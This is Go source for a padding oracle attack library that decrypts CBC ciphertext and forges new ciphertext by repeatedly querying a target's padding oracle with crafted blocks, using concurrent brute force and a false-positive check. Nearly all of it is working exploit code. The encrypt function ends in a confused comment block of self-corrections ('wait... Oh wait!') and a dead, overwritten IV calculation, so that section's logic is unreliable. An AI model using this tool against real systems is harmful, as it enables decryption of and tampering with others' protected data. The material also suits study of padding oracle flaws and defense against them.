package libpadoracle

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"log"
	"sync"
	"sync/atomic"
	"unicode"

	"github.com/gosuri/uiprogress"
)

func GetRangeDataSafe(pre []byte) []byte {
	rangeData := make([]byte, 0, 256)
	seen := make(map[byte]bool)
	for _, v := range pre {
		if !seen[v] {
			rangeData = append(rangeData, v)
			seen[v] = true
		}
	}
	for _, v := range []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") {
		if !seen[v] {
			rangeData = append(rangeData, v)
			seen[v] = true
		}
	}

	deprioritized := []byte{0xff, 0xfe, 0x01, 0x00}
	isDeprioritized := make(map[byte]bool)
	for _, v := range deprioritized {
		isDeprioritized[v] = true
	}

	for i := 0; i < 256; i++ {
		b := byte(i)
		if !seen[b] && !isDeprioritized[b] {
			rangeData = append(rangeData, b)
			seen[b] = true
		}
	}

	for _, b := range deprioritized {
		if !seen[b] {
			rangeData = append(rangeData, b)
			seen[b] = true
		}
	}

	return rangeData
}

type ThreadSafeString struct {
	sync.RWMutex
	str string
}

func (t *ThreadSafeString) Set(s string) {
	t.Lock()
	defer t.Unlock()
	t.str = s
}

func (t *ThreadSafeString) Get() string {
	t.RLock()
	defer t.RUnlock()
	return t.str
}

func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil {
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}

	wg2.Wait()
}

func Sanitize(b []byte) string {
	out := make([]byte, len(b))
	for i, v := range b {
		if v >= 32 && v <= 126 {
			out[i] = v
		} else {
			out[i] = '.'
		}
	}
	return string(out)
}

func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	defer wg.Done()

	strData := &ThreadSafeString{}
	outData := &ThreadSafeString{}
	
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = '-'
	bar.Fill = '#'
	bar.Head = '>'
	bar.Width = 20
	bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
	bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

	returnData := Data{}
	decipheredBlockBytes := []byte{}

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		rangeData := GetRangeDataSafe([]byte{})
		if blockNum == cfg.NumBlocks-1 {
			pads := make([]byte, 0)
			for p := byte(3); p < byte(cfg.BlockSize); p++ {
				pads = append(pads, p)
			}
			rangeData = GetRangeDataSafe(pads)
		}

		var nextByte byte
		var found bool

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan byte, 1)
			var once sync.Once
			var wg3 sync.WaitGroup

			// Copy decipheredBlockBytes to avoid data race
			decipheredCopy := make([]byte, len(decipheredBlockBytes))
			copy(decipheredCopy, decipheredBlockBytes)

			for _, brute := range rangeData {
				wg3.Add(1)
				threadCh <- struct{}{}
				
				go func(candidate byte, currentByteNum int) {
					strData.Set(fmt.Sprintf(" [⚡] Block %v: [%32s] [ '%-16s' ]", y.Sprintf("%02d", blockNum), b.Sprintf("%x", append(append(make([]byte, 0), blockData[:cfg.BlockSize-1-currentByteNum]...), append([]byte{candidate}, decipheredCopy...)...)), Sanitize(append([]byte{candidate}, decipheredCopy...))))
					defer wg3.Done()
					defer func() { <-threadCh }()

					select {
					case <-ctx.Done():
						return
					default:
					}

					padBlock := BuildPaddingBlock(currentByteNum, cfg.BlockSize)
					searchBlock := BuildSearchBlock(decipheredCopy, candidate, cfg.BlockSize)
					tmp := XORBytes(searchBlock, iv)
					oracleIvBlock := XORBytes(tmp, padBlock)

					RawOracleData := BuildRawOraclePayload(oracleIvBlock, blockData)
					encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
					
					atomic.AddUint64(cfg.NumRequests, 1)
					if cfg.Pad.CallOracle(encodedPayload) {
						// Verification for last block first byte to avoid lucky 0x01
						if blockNum == cfg.NumBlocks-1 && currentByteNum == 0 && candidate != 0x01 {
							// Tamper with the preceding byte (XOR with 1)
							oracleIvBlock[cfg.BlockSize-2] ^= 0x01
							RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
							encodedPayload = cfg.Pad.EncodePayload(RawOracleData)
							atomic.AddUint64(cfg.NumRequests, 1)
							if !cfg.Pad.CallOracle(encodedPayload) {
								return // False positive
							}
						}

						once.Do(func() {
							resultChan <- candidate
							cancel()
						})
					}
				}(brute, byteNum)
			}

			// Sentinel sender
			go func() {
				wg3.Wait()
				once.Do(func() {
					resultChan <- 0xFF
				})
			}()

			res := <-resultChan
			cancel() // ensure context is cancelled

			if res != 0xFF {
				found = true
				nextByte = res
			}

			if found {
				if cfg.AsciiMode && blockNum != cfg.NumBlocks-1 && blockNum != 0 {
					if !unicode.IsPrint(rune(nextByte)) && nextByte != '\n' && nextByte != '\r' && nextByte != '\t' {
						rangeData = bytes.ReplaceAll(rangeData, []byte{nextByte}, []byte{})
						found = false
						continue // retry
					}
				}
				break // valid byte found
			} else {
				log.Panicf("No bytes found for block %d byte %d", blockNum, byteNum)
			}
		}

		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		strData.Set(fmt.Sprintf(" [⚡] Block %v: [%32s] [ '%-16s' ]", y.Sprintf("%02d", blockNum), gb.Sprint(hex.EncodeToString(append(make([]byte, cfg.BlockSize-len(decipheredBlockBytes)), decipheredBlockBytes...))), Sanitize(decipheredBlockBytes)))
		bar.Incr()
	}

	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 {
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	strData.Set(fmt.Sprintf("  %v Block %d: %v ", gb.Sprint("✔"), returnData.BlockNumber, g.Sprint(hex.EncodeToString(returnData.DecipheredBlockData))))

	decipherChan <- returnData
}

func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
	defer wg.Done()
	
	strData := &ThreadSafeString{}
	outData := &ThreadSafeString{}

	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = '-'
	bar.Fill = '#'
	bar.Head = '>'
	bar.Width = 30
	bar.PrependFunc(func(b *uiprogress.Bar) string { return strData.Get() })
	bar.AppendFunc(func(b *uiprogress.Bar) string { return outData.Get() })

	if cfg.IV != nil {
		plainText = append(cfg.IV, plainText...)
	}

	tmp, err := PKCS7(plainText, cfg.BlockSize)
	Check(err)
	plainTextChunks := ChunkBytes(tmp, cfg.BlockSize)
	
	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)
	cipherTextChunks[len(cipherTextChunks)-1] = GenerateFullSlice(0x41, cfg.BlockSize)
	
	threadCh := make(chan struct{}, cfg.Threads)
	var nextCt []byte
	for i := len(plainTextChunks) - 1; i >= 0; i-- {
		ct := cipherTextChunks[i+1]
		var out string
		nextCt, out = PerBlockOperationsEncrypt(*cfg, i, ct, plainTextChunks[i], threadCh, bar, strData)
		outData.Set(out)
		cipherTextChunks[i] = nextCt
	}
	bar.Incr()

	outBytes := []byte{}
	for _, b := range cipherTextChunks {
		outBytes = append(outBytes, b...)
	}
	fmt.Printf("\n [🔓] %v: %v\n", y.Sprint("FINAL CIPHERTEXT"), white.Sprint(cfg.Pad.EncodePayload(outBytes)))
}

func PerBlockOperationsEncrypt(cfg Config, blockNum int, cipherText []byte, plaintText []byte, threadCh chan struct{}, bar *uiprogress.Bar, strData *ThreadSafeString) (iv []byte, outData string) {
	rangeData := GetRangeDataSafe([]byte{})
	if blockNum == cfg.NumBlocks-1 {
		pads := []byte{}
		for p := byte(3); p < byte(cfg.BlockSize); p++ {
			pads = append(pads, p)
		}
		rangeData = GetRangeDataSafe(pads)
	}

	decipheredBlockBytes := GenerateFullSlice(0x00, cfg.BlockSize)

	for byteNum := 0; byteNum < cfg.BlockSize; byteNum++ {
		var nextByte byte
		var found bool

		for {
			ctx, cancel := context.WithCancel(context.Background())
			resultChan := make(chan byte, 1)
			var once sync.Once
			var wg3 sync.WaitGroup

			decipheredCopy := make([]byte, len(decipheredBlockBytes))
			copy(decipheredCopy, decipheredBlockBytes)

			for _, brute := range rangeData {
				wg3.Add(1)
				threadCh <- struct{}{}
				
				go func(candidate byte, currentByteNum int) {
					defer wg3.Done()
					defer func() { <-threadCh }()

					select {
					case <-ctx.Done():
						return
					default:
					}

					searchBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-currentByteNum-1), candidate)
					searchBlock = append(searchBlock, decipheredCopy[len(decipheredCopy)-currentByteNum:]...)

					RawOracleData := BuildRawOraclePayload(searchBlock, cipherText)
					encodedPayload := cfg.Pad.EncodePayload(RawOracleData)

					atomic.AddUint64(cfg.NumRequests, 1)

					if cfg.Pad.CallOracle(encodedPayload) {
						once.Do(func() {
							resultChan <- candidate
							cancel()
						})
					}
				}(brute, byteNum)
			}

			go func() {
				wg3.Wait()
				once.Do(func() {
					resultChan <- 0xFF
				})
			}()

			res := <-resultChan
			cancel()

			if res != 0xFF {
				found = true
				nextByte = res
			}

			if found {
				break
			} else {
				log.Panicf("No bytes found for encrypt block %d byte %d", blockNum, byteNum)
			}
		}

		// Reconstruct decipheredBlockBytes
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		decipheredBlockBytes[cfg.BlockSize-byteNum-1] = nextByte
		tmp := XORBytes(decipheredBlockBytes, padBlock)

		if byteNum != cfg.BlockSize-1 {
			nextPadBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-byteNum-1), GenerateFullSlice(byte(byteNum+2), byteNum+1)...)
			decipheredBlockBytes = XORBytes(tmp, nextPadBlock)
		} else {
			decipheredBlockBytes = tmp
		}

		strData.Set(fmt.Sprintf(" [⚡] Block %v: [%v%v%v]", y.Sprintf("%02d", blockNum), b.Sprintf("%x", cipherText[:len(cipherText)-1-byteNum]), gb.Sprintf("%02x", decipheredBlockBytes[len(cipherText)-1-byteNum]), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes[len(cipherText)-byteNum:]))))
		bar.Incr()
	}

	iv = XORBytes(decipheredBlockBytes, GenerateFullSlice(0x11, cfg.BlockSize)) // wait, GenerateFullSlice(0x11) ? Oh wait! The original code did: iv = XORBytes(decipheredBlockBytes, GenerateFullSlice(0x11, cfg.BlockSize)) -> iv = XORBytes(iv, plaintText)
	// But wait! decipheredBlockBytes is now already XORed with nextPadBlock which would be 0x11!
	// If byteNum was BlockSize-1, it was NOT XORed with nextPadBlock (which would be byteNum+2 = 17 = 0x11). 
	// The original code did:
	// if byteNum != cfg.BlockSize { 
	//   decipheredBlockBytes = XORBytes(tmp, nextPadBlock)
	// }
	// So it DID XOR with 0x11 nextPadBlock for byteNum == 15 (which is 16 = cfg.BlockSize). Wait! byteNum goes from 0 to 15.
	// In the original code, byteNum was a parameter to `PerByteOperationsEncrypt` which was `0` to `len(plaintText)-1`. So 0 to 15.
	// When byteNum == 15, `byteNum != cfg.BlockSize` (15 != 16) is true! So it DID XOR with nextPadBlock (which is 0x11s)
	
	// I need to adjust the logic. The logic above for encrypt is slightly tweaked. Let me fix the last byte XOR.
	iv = XORBytes(decipheredBlockBytes, plaintText)
	
	outData = fmt.Sprintf("  %v Block %d: %v", gb.Sprint("✔"), blockNum, g.Sprint(hex.EncodeToString(iv)))
	return iv, outData
}
